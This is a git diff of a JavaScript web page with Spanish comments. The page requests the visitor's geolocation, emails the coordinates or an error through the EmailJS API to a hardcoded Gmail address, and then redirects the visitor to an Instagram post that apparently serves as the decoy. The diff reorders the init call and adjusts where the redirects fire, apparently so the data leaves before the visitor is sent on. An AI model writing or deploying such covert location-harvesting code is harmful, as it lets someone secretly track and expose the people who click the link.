@@ -24,17 +24,15 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
+        (function() {
+                emailjs.init("RQTeGwCpct3CA61tM");  // Sustituye con tu ID de usuario de EmailJS
+            })();
+
         async function ejecutar() {
             console.log("Inicia la acción...");
             await wait(1500); // Espera 500 milisegundos
             console.log("Pasaron 500 milisegundos. Continúa el código...");
-            
-            (function() {
-                emailjs.init("RQTeGwCpct3CA61tM");  // Sustituye con tu ID de usuario de EmailJS
-            })();
-            
-            
-
+        
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -72,8 +70,6 @@
                         });
 
 
-
-                        window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
                     },
                     (error) => {
                         switch (error.code) {
@@ -92,7 +88,7 @@
                         };
 
                         console.log("La ubicacion fue: "+locationParagraph);
-
+                        
                         var data = {
                             service_id: 'service_nypofhc',
                             template_id: 'template_n7zn6jj',
@@ -112,46 +108,18 @@
                         })
                         .then(response => response.json())  // Convierte la respuesta en formato JSON
                         .then(data => {
-                            // console.log('Your mail is sent!');  // console.loga si el correo es enviado correctamente
+                            console.log('Your mail is sent!');  // console.loga si el correo es enviado correctamente
                             window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
                         })
                         .catch(error => {
-                        // console.log('Oops... ' + JSON.stringify(error));  // console.loga si hay un error
+                         console.log('Oops... ' + JSON.stringify(error));  // console.loga si hay un error
                         window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
                         });
-                        window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
+                        
                     }
                 );
             } else {
-                locationParagraph = "La Geolocalización no es soportada por este navegador.";
-                console.log("La ubicacion fue: "+locationParagraph);
-                var data = {
-                            service_id: 'service_nypofhc',
-                            template_id: 'template_n7zn6jj',
-                            user_id: 'RQTeGwCpct3CA61tM',
-                            template_params: {
-                                'username': 'nestorgt37@gmail.com',
-                                'message': locationParagraph
-                            }
-                        };
-
-                        fetch('https://api.emailjs.com/api/v1.0/email/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(data)  // Convierte el objeto `data` a JSON
-                        })
-                        .then(response => response.json())  // Convierte la respuesta en formato JSON
-                        .then(data => {
-                            // console.log('Your mail is sent!');  // console.loga si el correo es enviado correctamente
-                            window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";     
-                        })
-                        .catch(error => {
-                        // console.log('Oops... ' + JSON.stringify(error));  // console.loga si hay un error
-                        window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
-                        });
-                window.location.href = "https://www.instagram.com/p/DD-WPw5NE2O/";    
+                locationParagraph = "La Geolocalización no es soportada por este navegador.";                    
             }
         }
 
